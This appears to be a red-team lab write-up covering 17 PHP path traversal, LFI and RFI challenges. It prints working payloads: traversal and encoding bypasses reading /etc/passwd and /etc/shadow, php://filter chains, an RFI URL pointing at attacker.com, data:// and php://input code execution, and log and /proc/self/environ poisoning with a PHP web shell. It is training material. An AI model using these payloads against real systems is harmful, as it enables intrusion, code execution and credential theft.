@@ -1,0 +1,643 @@
+---
+id: ptsd-lab-path-traversal-lfi-rfi-writeup
+title: "PTSD Lab - Path Traversal + LFI/RFI (17 tasks) - write-up “what I see / what I think / what I click”"
+team: red
+domain: labs-writeups
+section: ptsd
+topic: path-traversal-lfi-rfi
+type: writeup
+angle: file-inclusion-and-traversal-lab-workflow
+sourceTrack: sah-0-to-1
+tags: ["path-traversal", "lfi", "rfi", "php", "php-wrappers", "php-filters", "waf-bypass"]
+difficulty: mixed
+shortDescription: "A technical writeup covering 17 PTSD Lab challenges around path traversal, LFI, and RFI, structured in a practical ‘what I see / what I think / what I click’ format, with emphasis on recognizing the bug mechanics, choosing bypasses, using PHP wrappers, and moving from basic file read to more dangerous exploitation paths."
+updatedAt: "2026-03-03"
+---
+
+# PTSD Lab - Path Traversal + LFI/RFI (17 tasks)
+
+## Compass (before you start clicking)
+
+- `readfile()` / `file_get_contents()` → usually **reading** (Path Traversal / LFI-read).
+- `include()` / `require()` → **including and interpreting** (LFI/RFI, often escalates to RCE).
+- “WAF blocks `../`” → think: **normalization / decoding / different layers**.
+- Windows → think: **backslash** and sometimes wildcard tricks.
+
+---
+
+# 01) Reading index.php via basic traversal (EASY - 100)
+
+![Task 01 - screenshot](/field-manual/assets/ptsd_path_traversal/01.png)
+
+### What I see
+
+The code concatenates a prefix with my parameter and reads the file:
+
+```php
+$file = $_GET['image'];
+echo file_get_contents('/var/www/html/files/' . $file);
+```
+
+### What I think
+
+“This is classic **path traversal**. I’m testing `../`.”
+
+### What I click / what I type
+
+- `../index.php`
+
+### What I observe
+
+- The response changes: either the file content, or a “no such file” error.
+
+### Why it works
+
+The OS normalizes paths: `files/../index.php` → `index.php`.
+
+### What to try if it doesn’t work
+
+- `../../index.php`
+- `%2e%2e%2findex.php`
+
+### Common pitfall
+
+Assuming the prefix “isolates” you. Without normalization and validation - it doesn’t.
+
+### Black-box (no source) - how I’d identify it and drive it
+
+- I look for parameters like `file`, `img`, `download`, `path`, `page`.
+- I send a control test: `test.txt` vs `doesnotexist` → I compare error differences.
+- Then I try `../` → I check whether the path in the error/status changes.
+- Only then I go for a known target: `../../../etc/passwd` or `..\..\Windows\win.ini`.
+
+---
+
+# 02) Read /etc/passwd - null byte suffix bypass (EASY - 150)
+
+![Task 02 - screenshot](/field-manual/assets/ptsd_path_traversal/02.png)
+
+### What I see
+
+A `.php` suffix is appended to `include()`:
+
+```php
+$page = $_GET['file'];
+include($page . '.php');
+```
+
+### What I think
+
+“The appended suffix breaks my target. Historically, I try a **null byte**.”
+
+### What I click / what I type
+
+- `../../../etc/passwd`
+- `../../../etc/passwd%00`
+
+### What I observe
+
+- On legacy labs, `%00` may work.
+
+### Why it works
+
+In old PHP versions, a null byte could terminate the string before the suffix was applied.
+
+### What to try next
+
+- If `%00` fails: treat it as a “why it used to work” lesson - in real targets I look for other bypasses.
+
+### Common pitfall
+
+Assuming `%00` is universal. It’s mostly archaeology.
+
+### Black-box
+
+- After `../../../etc/passwd`, I inspect the error: do I see `.php` appended in the path?
+- If yes: I verify it’s PHP and whether the error hints at an older stack.
+- In practice, instead of null byte I more often go for: `php://filter` (if it’s include), or a different endpoint without suffix appending.
+
+---
+
+# 03) PHP Filter: source code disclosure via base64 (MEDIUM - 250)
+
+![Task 03 - screenshot](/field-manual/assets/ptsd_path_traversal/03.png)
+
+### What I see
+
+```php
+$page = $_GET['page'];
+include($page);
+```
+
+### What I think
+
+“`include()` = execution. I want **source code** → `php://filter`.”
+
+### What I click / what I type
+
+- `php://filter/convert.base64-encode/resource=config.php`
+
+### What I observe
+
+- Base64 in the response → I decode it → I get the code.
+
+### Why it works
+
+The filter returns text (base64), not “live” PHP.
+
+### What to try if needed
+
+- `resource=/var/www/html/config.php` (if relative paths don’t work)
+
+### Common pitfall
+
+Testing `?page=config.php` and being surprised that nothing is “displayed”.
+
+### Black-box
+
+- I recognize include by symptoms: “failed to open stream”, “include():”.
+- If it’s include: I immediately try `php://filter/.../resource=index.php`.
+- If I get base64, I know I have disclosure without RCE.
+
+---
+
+# 04) PHP Filter chain - bypassing a “base64” block (MEDIUM - 300)
+
+![Task 04 - screenshot](/field-manual/assets/ptsd_path_traversal/04.png)
+
+### What I see
+
+A block on the string `base64`, but it’s still include.
+
+### What I think
+
+“It’s a blacklist. I’ll bypass with a different filter / a chain.”
+
+### What I click / what I type
+
+- `php://filter/read=string.rot13/resource=secret.php`
+- `php://filter/convert.iconv.UTF-8.UTF-16/resource=secret.php`
+- `php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.iconv.UTF-8.UTF-7/resource=secret.php`
+
+### What I observe
+
+- “Distorted” output → I reverse the transformation.
+
+### Why it works
+
+The WAF blocks a keyword, not the wrapper mechanism.
+
+### Common pitfall
+
+Sticking to base64 instead of thinking “any transformation = disclosure”.
+
+### Black-box
+
+- If `php://filter/...base64...` is blocked with 403/“forbidden” → I try a filter without the word “base64”.
+- I check whether the block depends on RAW input vs decoded input.
+- ROT13 often passes when base64 is blocked in a naive way.
+
+---
+
+# 05) WAF bypass - URL-encoded traversal (MEDIUM - 300)
+
+![Task 05 - screenshot](/field-manual/assets/ptsd_path_traversal/05.png)
+
+### What I see
+
+The WAF blocks `../`, backend does `readfile('/base/' . $file)`.
+
+### What I think
+
+“The filter is looking at RAW input. I’ll encode it.”
+
+### What I click / what I type
+
+- `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow`
+
+### What I observe
+
+- It gets through where `../../../etc/shadow` was blocked.
+
+### Why it works
+
+The backend receives decoded `../`.
+
+### Common pitfall
+
+Encoding only part of the sequence.
+
+### Black-box
+
+- First I determine if the block is regex on `../` (403) or “soft” (backend sanitization).
+- If 403: I try `%2e%2e%2f` and `%2e%2e/`.
+- If the backend “cleans”: I test double-encoding (#06).
+
+---
+
+# 06) Double URL encoding - proxy/backend mismatch (HARD - 400)
+
+![Task 06 - screenshot](/field-manual/assets/ptsd_path_traversal/06.png)
+
+### What I see
+
+The backend calls `urldecode()` explicitly:
+
+```php
+$file = urldecode($_GET['doc']);
+readfile('/docs/' . $file);
+```
+
+### What I think
+
+“There are **two decoding steps**. I’ll use `%25`.”
+
+### What I click / what I type
+
+- `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`
+
+### What I observe
+
+- It works despite front-layer filtering.
+
+### Why it works
+
+After 1 decode you get `%2e%2e%2f`, after 2 decodes you get `../`.
+
+### Common pitfall
+
+Forgetting `%25`.
+
+### Black-box
+
+- If I see a proxy/CDN/WAF in front and outcomes depend on “how I encode”, I immediately test double-encoding.
+- I also test variants like `%252f`, `%255c` (Windows).
+
+---
+
+# 07) Null byte injection - truncate appended .html (MEDIUM - 250)
+
+![Task 07 - screenshot](/field-manual/assets/ptsd_path_traversal/07.png)
+
+### What I see
+
+`include('/templates/' . $tpl . '.html')`
+
+### What I think
+
+“Suffix. Historically: null byte.”
+
+### What I click / what I type
+
+- `../../../etc/passwd%00`
+
+### Why it works
+
+Legacy null byte truncation.
+
+### Common pitfall
+
+Expecting it to work on a modern stack.
+
+### Black-box
+
+- If the error shows the final path with `.html`, I know the suffix is being appended.
+- In real targets, instead of `%00` I more often try: `....//`, encoding, or find an endpoint that doesn’t append a suffix.
+
+---
+
+# 08) Bypass blacklist '../' using ....// (MEDIUM - 300)
+
+![Task 08 - screenshot](/field-manual/assets/ptsd_path_traversal/08.png)
+
+### What I see
+
+A regex blacklist for `../` (custom logic).
+
+### What I think
+
+“Blacklist = bypassable. I’m looking for a form the regex won’t match, but the system will normalize.”
+
+### What I click / what I type
+
+- `....//....//....//etc/hostname`
+
+### Why it works
+
+Regex filtering ≠ real normalization. You bypass matching, and the path still resolves.
+
+### Common pitfall
+
+Skipping control tests and jumping straight to exotic bypasses.
+
+### Black-box
+
+- If I get “Forbidden” for `../`, I test: `%2e%2e%2f`, double-encode, `....//`, mixed separators.
+- I check whether the block is just string-based or uses `realpath`/whitelisting.
+
+---
+
+# 09) Remote File Inclusion (RFI) + suffix bypass (HARD - 450)
+
+![Task 09 - screenshot](/field-manual/assets/ptsd_path_traversal/09.png)
+
+### What I see
+
+`include($module . '.php')` and RFI is allowed.
+
+### What I think
+
+“The suffix breaks the URL. I’ll use `?` or `#`.”
+
+### What I click / what I type
+
+- `http://attacker.com/shell?`
+
+### Why it works
+
+The appended `.php` lands in the query string.
+
+### Common pitfall
+
+Not realizing that in real life `allow_url_include` is almost always OFF.
+
+### Black-box
+
+- I recognize RFI by the app attempting to fetch a URL (timing/DNS/outbound requests).
+- I test a canary URL (controlled domain).
+- If there’s a suffix: `?` / `#`.
+
+---
+
+# 10) data:// wrapper - PHP code in the URL (HARD - 450)
+
+![Task 10 - screenshot](/field-manual/assets/ptsd_path_traversal/10.png)
+
+### What I see
+
+Include on a parameter, and the lab allows stream wrappers.
+
+### What I think
+
+“If I can include a stream, `data://` gives me a payload without hosting a file.”
+
+### What I click / what I type
+
+- `data://text/plain,<?php phpinfo(); ?>`
+- `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`
+
+### Why it works
+
+`include()` interprets the wrapper content as PHP.
+
+### Common pitfall
+
+Incorrect `data://` syntax.
+
+### Black-box
+
+- If `http://` fails (RFI off) but include exists → I try local wrappers (`php://filter`, `data://`, `php://input`) depending on policy.
+- Errors like “wrapper is disabled” are still valuable signals.
+
+---
+
+# 11) php://input - wrapper as the parameter value (HARD - 400)
+
+![Task 11 - screenshot](/field-manual/assets/ptsd_path_traversal/11.png)
+
+### What I see
+
+Hint: **"Just type: php://input"**. The UI field is the parameter value.
+
+### What I think
+
+“The lab tests wrapper recognition. I type only `php://input`.”
+
+### What I click / what I type
+
+- `php://input`
+
+### Why it works
+
+`php://input` returns the raw request body as a stream.
+
+### Real-world notes
+
+- Parameter: `file=php://input`
+- POST body: `<?php system('id'); ?>`
+
+### Common pitfall
+
+Mixing the parameter, the body, and PHP code in one input field.
+
+### Black-box
+
+- If I can send POST and see an include on `file=`: I test `php://input`.
+- I check whether the app accepts raw body (not multipart).
+- If it works: next I verify if I can fully control the body and whether this becomes RCE or only errors.
+
+---
+
+# 12) Windows traversal - backslash bypass (MEDIUM - 300)
+
+![Task 12 - screenshot](/field-manual/assets/ptsd_path_traversal/12.png)
+
+### What I see
+
+Windows paths in code.
+
+### What I think
+
+“If `../` is blocked, `..\` often passes.”
+
+### What I click / what I type
+
+- `..\..\..\Windows\System32\drivers\etc\hosts`
+- `..%5c..%5c..%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts`
+
+### Why it works
+
+`\` is a path separator on Windows.
+
+### Common pitfall
+
+Using `\` on Linux.
+
+### Black-box
+
+- I identify Windows via errors (`C:\...`) or server banners.
+- I test common Windows targets: `..\..\Windows\win.ini` or `System32\drivers\etc\hosts`.
+- I mix separators and encoding based on filtering behavior.
+
+---
+
+# 13) LFI + Log Poisoning - Apache access.log (HARD - 500)
+
+![Task 13 - screenshot](/field-manual/assets/ptsd_path_traversal/13.png)
+
+### What I see
+
+`include($view)`.
+
+### What I think
+
+“No upload? Then I look for a file I can write into indirectly: logs.”
+
+### What I do
+
+1. Poison UA: `<?php system($_GET["cmd"]); ?>`
+2. LFI into the log: `../../../var/log/apache2/access.log`
+3. `&cmd=id`
+
+### Why it works
+
+The log contains PHP and `include()` will execute it.
+
+### Common pitfall
+
+Including the log without poisoning it first.
+
+### Black-box
+
+- If include works and I don’t have direct upload: I look for logs, session files, temp files.
+- First I confirm I can inject a controlled marker into a log (UA/Referer).
+- Then I try LFI to common log paths and check whether my marker appears.
+
+---
+
+# 14) LFI via /proc/self/environ - CGI poisoning (HARD - 500)
+
+![Task 14 - screenshot](/field-manual/assets/ptsd_path_traversal/14.png)
+
+### What I see
+
+LFI + CGI/procfs context.
+
+### What I think
+
+“Headers → env vars → `/proc/self/environ`.”
+
+### What I do
+
+1. Poison UA: `<?php system($_GET["cmd"]); ?>`
+2. LFI: `../../../proc/self/environ`
+3. `&cmd=id`
+
+### Why it works
+
+In CGI, headers map into environment variables, exposed via procfs.
+
+### Common pitfall
+
+Assuming it works on every PHP deployment model.
+
+### Black-box
+
+- I verify Linux + CGI/FastCGI hints.
+- I inject a non-PHP marker first (e.g., `AAAA`) in a header.
+- I LFI `/proc/self/environ` and confirm the marker → only then I attempt PHP.
+
+---
+
+# 15) Path truncation - padding ONLY /./ (HARD - 500)
+
+![Task 15 - screenshot](/field-manual/assets/ptsd_path_traversal/15.png)
+
+### What I see
+
+A truncation description and path length limits.
+
+### What I think
+
+“Neutral padding that doesn’t change the path: `/./`.”
+
+### What I click / what I type
+
+- `../../../etc/passwd/./././././././././././././././././././././././././././././././`
+
+### Why it works
+
+`/./` increases length but normalizes to the same target.
+
+### Common pitfall
+
+Appending `...` instead of repeating `/./`.
+
+### Black-box
+
+- If I see a suffix being appended and classic bypasses fail, I consider truncation as an edge case.
+- I use neutral segments (`/./`) and watch whether the error changes (e.g., suffix disappears in logs/errors).
+- On real targets you often need large lengths; in labs the concept is the key.
+
+---
+
+# 16) expect:// wrapper - command execution (HARD - 500)
+
+![Task 16 - screenshot](/field-manual/assets/ptsd_path_traversal/16.png)
+
+### What I see
+
+A mention of the `expect` wrapper.
+
+### What I think
+
+“If the wrapper exists, it’s straightforward: `expect://cmd`.”
+
+### What I click / what I type
+
+- `expect://id`
+
+### Why it works
+
+The wrapper runs the command and returns output as a stream.
+
+### Common pitfall
+
+Trying it without the extension enabled.
+
+### Black-box
+
+- I look for leaks about extensions (phpinfo, errors, stack traces).
+- If I see `expect`, I test a minimal command like `id`.
+- If there are no signals - I don’t waste time; it’s rare.
+
+---
+
+# 17) Windows FindFirstFile wildcard - < for unknown extensions (HARD - 500)
+
+![Task 17 - screenshot](/field-manual/assets/ptsd_path_traversal/17.png)
+
+### What I see
+
+Windows + include + `.php` suffix.
+
+### What I think
+
+“I want `db_config.*` without knowing the extension. Legacy wildcard tricks.”
+
+### What I click / what I type
+
+- `..\private\db_config<`
+
+### Why it works
+
+In Win32 API, `<` can be treated as a wildcard for extension matching.
+
+### Common pitfall
+
+Testing this outside of Windows or in environments that don’t resolve paths this way.
+
+### Black-box
+
+- First I confirm Windows (errors showing `C:\`, server headers).
+- If a suffix is appended and I don’t know the target’s extension: I try Windows-specific wildcard techniques.
+- I verify consistency (does it return the “first match”, does the returned file change if I change the prefix).
+
+---
+
+## Key takeaways from the lab
+
+1. Recognizing the mechanism (read vs include) matters more than payload lists.
+2. Most WAF bypasses boil down to normalization differences between layers.
+3. LFI becomes dangerous when you have an indirectly writable file (log/environ/input).
+4. In simulated labs, the UI often represents only the parameter value - the hint tells you what layer is being tested.
